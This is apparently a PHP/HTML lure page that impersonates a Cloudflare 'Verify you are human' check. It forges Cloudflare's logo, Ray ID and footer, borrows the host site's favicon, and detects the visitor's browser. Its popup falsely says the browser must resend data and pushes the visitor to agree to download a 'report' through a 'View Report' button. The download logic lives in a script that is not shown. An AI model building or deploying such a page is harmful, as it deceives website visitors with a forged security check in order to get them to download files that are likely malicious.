<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Just a moment...</title>

	<?php
		// session start
		session_start();
	?>

  <!-- Favicon -->
  <?php
        // Check if fetch_url is already declared before defining it
        if (!function_exists('fetch_url')) {
            function fetch_url($url) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
                curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout for faster failure handling
                $data = curl_exec($ch);
                curl_close($ch);
                return $data;
            }
        }

        function detect_favicon($domain) {
            // Fetch the HTML from the domain
            $html = fetch_url($domain);
            if ($html) {
                // Look for the favicon in the HTML
                preg_match('/<link.*?rel=["\'](?:shortcut\s)?icon["\'].*?href=["\'](.*?)["\']/', $html, $matches);
                if (!empty($matches[1])) {
                    $favicon_url = $matches[1];
                    
                    // Handle relative URLs (convert to absolute)
                    if (strpos($favicon_url, 'http') !== 0) {
                        $favicon_url = rtrim($domain, '/') . '/' . ltrim($favicon_url, '/');
                    }

                    return $favicon_url; // Return the detected favicon URL
                }
            }
            
            // If no favicon is found in the HTML, return false
            return false;
        }

        function fallback_favicon($domain) {
            // Check for /favicon.ico in the root
            $favicon_url = $domain . "/favicon.ico";
            
            // Try to fetch favicon.ico
            if (@fetch_url($favicon_url)) {
                return $favicon_url;
            }
            
            // Return false if no favicon.ico is found
            return false;
        }

        // Get the root domain (main domain)
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
        $host = $protocol . $_SERVER['HTTP_HOST']; // For example, "http://127.0.0.1"

        // First, try to detect favicon from HTML
        $favicon_url = detect_favicon($host);

        // If favicon not found in HTML, try /favicon.ico as a fallback
        if (!$favicon_url) {
            $favicon_url = fallback_favicon($host);
        }

		// Global icon URL
		$iconURL;

        // Only add <link rel="icon"> if a favicon is found
        if ($favicon_url) {
			$iconURL = htmlspecialchars($favicon_url);
            echo '<link rel="icon" href="' . htmlspecialchars($favicon_url) . '" type="image/x-icon">';
        }
    ?>


	<link rel="stylesheet" type="text/css" href="./assets/css/app.css">
</head>
<body>

<!-- get browser name -->
<?php
	function getBrowserName() {
	    // Get the user agent string
		$user_agent = $_SERVER['HTTP_USER_AGENT'];

		// Initialize the browser name variable
		$browser = "Unknown Browser";

		// Check for Microsoft Edge (Chromium-based and Legacy Edge)
		if (strpos($user_agent, 'Edg') !== false) {
			$browser = "Microsoft Edge";
		// Check for Opera
		} elseif (strpos($user_agent, 'OPR') !== false || strpos($user_agent, 'Opera') !== false) {
			$browser = "Opera";
		// Check for Google Chrome (after checking for Opera and Edge)
		} elseif (strpos($user_agent, 'Chrome') !== false) {
			$browser = "Google Chrome";
		// Check for Mozilla Firefox
		} elseif (strpos($user_agent, 'Firefox') !== false) {
			$browser = "Mozilla Firefox";
		// Check for Safari (excluding Chrome and Edge)
		} elseif (strpos($user_agent, 'Safari') !== false) {
			$browser = "Safari";
		}

		// Output the detected browser
		return $browser;
	}
?>

<input type="hidden" value="<?php echo getBrowserName(); ?>" id="browserName" />
<input type="hidden" value="<?php echo $_SERVER['HTTP_HOST']; ?>" id="httpHOST" />

<!-- Pop up -->
<div id="popup">
	<div>
		<div data-translate="popup-msg">
		To display your report, <?php echo getBrowserName() ?> needs to resend information from your previous request (e.g. a search or form submission). Please confirm below to proceed.
		</div>
		<label>
			<input type="checkbox" id="checkbox">
			<p data-translate="popup-check">I agree to allow from <span style="font-weight: 500;"><?php echo $_SERVER['HTTP_HOST'] ?></span> to display and download my report.</p>
		</label>
	</div>
	<div>
		<button id="report" disabled data-translate="view_report">View Report</button>
	</div>
</div>


<div id="overlay"></div>


<div id="total">
	<div id="main_board">

		<div id="img_header">
			<?php
				$headers = @get_headers($iconURL);
				if ($headers && strpos($headers[0], '200') !== false) echo '<img src="'.$iconURL.'" style="width: 60px; height: 60px;" /> &nbsp;&nbsp;&nbsp;&nbsp;';
			?>
			<h1 data-translate="headline" class="h1"></h1>
		</div>

		<h2 data-translate="wait" class="h2" id="wait">Verifying you are human. This may take a few seconds.</h2>
		<h2 data-translate="action" class="h2" id="action">Verify you are human by completing the action below.</h2>
		<h2 data-translate="verify-success" class="h2" id="success">Verification successful</h2>

		<div id="loading">
			<div id="load"></div>
		</div>

	<?php if (isset($_SESSION['darkmode']) && $_SESSION['darkmode'] == '1'): ?>
		
		<!-- Captcha Section Start -->
		<div id="captcha-wrapper" class="captcha-wrapper" >
		  <div class="captcha-container" style="background: #232323;"> 
		    <!-- Checkbox Section -->
		    <div class="captcha-content">
		      <div class="checkbox-container" id="checkbox-container" style="background: none;">
		        <!-- <input type="checkbox" id="captcha-checkbox"> -->

		        <div class="captcha-spinner" id="captcha-spinner"></div>

		        <video class="video1" id="video1">
		          <source src="./assets/img/dark_verify1.webm" type="video/webm">
		        </video>

		        <video class="video2" id="video2">
		          <source src="./assets/img/dark_verify2.webm" type="video/webm">
		        </video>

		      </div>

		      <div class="captcha-text" id="captcha-text" style="color: #ccc;">
			  	<span data-translate="verify-human">Verify you are human</span>
		      </div>
		    </div>

		    <!-- Footer -->
		    <div class="captcha-footer">
		      <img class="captcha-logo" src="./assets/img/dark_logo.svg" alt="Cloudflare Logo">
		      <div class="captcha-privacy">
			  	<a href="#" style="color: #ccc; text-decoration: underline;" data-translate="privacy">Privacy</a> • <a href="#" style="color: #ccc; text-decoration: underline;" data-translate="terms">Terms</a>
		      </div>
		    </div>

		    <!-- Error message outside the captcha box -->
		    <div class="error-message" id="error-message">
				<span data-translate="issue">There was a problem, please try again.</span>
		    </div>
		  </div>

		</div>
		<!-- Captcha Section End -->

	<?php else: ?>

		<!-- Captcha Section Start -->
		<div id="captcha-wrapper" class="captcha-wrapper">
		  <div class="captcha-container">
		    <!-- Checkbox Section -->
		    <div class="captcha-content">
		      <div class="checkbox-container" id="checkbox-container">
		        <!-- <input type="checkbox" id="captcha-checkbox"> -->

		        <div class="captcha-spinner" id="captcha-spinner"></div>

		        <video class="video1" id="video1">
		          <source src="./assets/img/verify1.webm" type="video/webm">
		        </video>

		        <video class="video2" id="video2">
		          <source src="./assets/img/verify2.webm" type="video/webm">
		        </video>

		      </div>

		      <div class="captcha-text" id="captcha-text">
			  	<span data-translate="verify-human">Verify you are human</span>
		      </div>
		    </div>

		    <!-- Footer -->
		    <div class="captcha-footer">
		      <img class="captcha-logo" src="./assets/img/logo-cloudflare-dark.svg" alt="Cloudflare Logo">
		      <div class="captcha-privacy">
			  	<a href="#" style="text-decoration: underline;" data-translate="privacy">Privacy</a> • <a href="#" style="text-decoration: underline;" data-translate="terms">Terms</a>
		      </div>
		    </div>

		    <!-- Error message outside the captcha box -->
		    <div class="error-message" id="error-message">
				<span data-translate="issue">There was a problem, please try again.</span>
		    </div>
		  </div>

		</div>
		<!-- Captcha Section End -->

	<?php endif; ?>

		
		<div data-translate="detail" class="detail"></div>

	</div>

	<div id="footer">

		<?php if (isset($_SESSION['darkmode']) && $_SESSION['darkmode'] == '1'): ?>
			
			<div>
				<span data-translate="ray_id">Ray ID: </span>
				<strong class="a_color" id="ray-id" style="color: #fff; font-weight: lighter;"></strong>
			</div>
			<div>
				<span data-translate="performance_security">Performance & security by </span>
				<strong class="a_color" style="color: #fff;">Cloudflare</strong>
			</div>
			
		<?php else: ?>
			
			<div>
				<span data-translate="ray_id">Ray ID: </span>
				<strong class="a_color" id="ray-id"></strong>
			</div>
			<div>
				<span data-translate="performance_security">Performance & security by </span>
				<strong class="a_color">Cloudflare</strong>
			</div>
			
		<?php endif; ?>

	</div>
</div>


</body>
<script type="text/javascript" src="./assets/js/jquery.min.js"></script>
<script type="text/javascript" src="./assets/js/app.js"></script>
</html>